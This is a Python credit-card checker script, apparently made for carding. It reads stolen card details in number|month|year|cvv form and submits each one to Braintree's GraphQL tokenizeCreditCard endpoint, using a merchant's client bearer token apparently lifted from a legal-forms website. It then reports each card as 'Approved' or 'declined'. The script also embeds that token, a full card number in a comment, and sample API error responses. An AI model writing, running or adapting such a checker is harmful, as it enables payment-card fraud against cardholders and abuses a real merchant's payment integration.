import requests,re,time
def brn6(ccx):
	import requests#𝙈𝙊𝙆𝙎𝙃𝘼
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#𝙈𝙊𝙆𝙎𝙃𝘼
		yy = yy.split("20")[1]
	r = requests.session()
#	time.sleep(20)
	import requests

#https://www.360legalforms.com/myaccount



	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjYzMTIxMzYsImp0aSI6ImNjNzc2YjBmLTIzNDgtNDlhMS1iYjgyLTU1ZmQ1NjBkMWIxMCIsInN1YiI6ImoyN3k1cXh2dHRyd3lqODQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImoyN3k1cXh2dHRyd3lqODQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsiY3VzdG9tZXJfaWQiOiI1OTg5NzIxMTkwMSIsInBheXBhbF9jbGllbnRfaWQiOiJBYkNZR2s0ai1IRXdZTFZEOFFQMVhhWFdCZjY2eTFoS3AtZklabDZuME5HRnNlYWhMa3EzelZXaTg5MWJFOFJackRWTURyejRDMFJBOGN0YSJ9fQ.bgMRUTOT_cXlNqzafURiHBiszP5vnXnxBlpYAsOWkoxmdnav3S859Gxjc5QGP68AIFiFnZwdmRfSZKw_QrW3Dw?customer_id=',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '61b56e2a-52a0-442f-8c9c-40d696b16658',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'moksha',
	                'billingAddress': {
	                    'postalCode': '10080',
	                },
	            },
	            'options': {
	                'validate': True,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"e2ecc472-b6fe-47f9-af79-a091815d2ecb"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5491862017451657","expirationMonth":"07","expirationYear":"2026","cvv":"000","cardholderName":"\u202aMØĶ SĤĀ\u202c\u200f","billingAddress":{"postalCode":"10080"}},"options":{"validate":true}}},"operationName":"TokenizeCreditCard"}'.encode()
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	
		



	v = response.json()
#	print(v)  
	

	if "data" in v and v["data"].get("tokenizeCreditCard"):
	    return 'Approved'
	

	elif "errors" in v or "CVV verification failed" in str(v) or "Postal code verification failed" in str(v):
	    return 'declined'
	

	else:
	    return 'Unknown'
	    
	    
	    
	    #t', 'authorizationFingerprint'], 'legacyCode': '93203'}}], 'data': {'tokenizeCreditCard': None}, 'extensions': {'requestId': 'd4315cc0-c1c7-47e9-9b0d-fc116dca61b3'}}
#{'errors': [{'message': 'Authorization fingerprint signature has been revoked', 'locations': [{'line': 1, 'column': 67}], 'path': ['tokenizeCreditCard'], 'extensions': {'errorClass': 'AUTHORIZATION', 'errorType': 'user_error', 'inputPath': ['input', 'authorizationFingerprint'], 'legacyCode': '93203'}}], 'data': {'tokenizeCreditCard': None}, 'extensions': {'requestId': 'fade04d7-31d5-4c0b-a3fc-6675c8d04399'}}